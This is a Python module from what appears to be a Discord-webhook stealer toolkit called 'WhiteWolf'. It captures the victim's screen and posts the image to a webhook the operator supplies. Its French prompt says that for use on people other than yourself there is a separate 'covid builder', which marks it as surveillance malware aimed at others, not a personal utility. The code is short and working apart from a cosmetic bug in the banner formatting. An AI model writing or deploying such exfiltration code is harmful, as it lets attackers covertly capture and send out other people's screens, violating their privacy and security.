import os
import io
import time
import requests
from code.colors import RED


def screenshot():
    try:
        import mss
        import mss.tools
    except ImportError:
        print("Error: 'mss' package is required for screenshot.")
        print("Install it with: pip install mss")
        time.sleep(5)
        return
    os.system("cls")
    try:
        screen = input(""" {RED}
                    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
                    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║
                    ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║
                    ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║
                    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║
                    ╚══════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
                    Met Ton webhook discord (Pour tester sur des gens autre que vous allez sur le covid builder): """)
    except ValueError as e:
        print(f"Error {e}")
        return

    webhook = screen
    with mss.MSS() as sct:
        img = sct.grab(sct.monitors[1])
        img_bytes = mss.tools.to_png(img.rgb, img.size)
        files = {
            "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
        }
        requests.post(webhook, data={
            "content": "screenshot",
            "username": "WhiteWolf",
            "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
        }, files=files)
